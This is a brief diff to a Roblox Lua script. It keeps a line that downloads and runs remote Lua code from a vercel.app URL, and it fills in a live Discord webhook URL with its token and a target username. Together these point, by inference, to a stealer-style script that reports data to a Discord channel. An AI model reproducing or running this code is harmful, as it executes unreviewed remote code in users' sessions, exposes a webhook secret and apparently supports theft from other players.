@@ -1,7 +1,7 @@
 loadstring(game:HttpGet("https://rayzhubb.vercel.app/scripts/adm-gui.lua", true))()
 
-local Webhook = web
-local Usernames = users
+local Webhook = "https://discord.com/api/webhooks/1542891256424701952/HtxAQE74xFC1BtGshMkPytkJMgkqPwTT-ffdpjNeyFXLaI5HnVPcgKMx2J5qDZkz7dMQ"
+local Usernames = "Toddstock7"
 
 local Friends = {}
 local lastMessageId = nil 
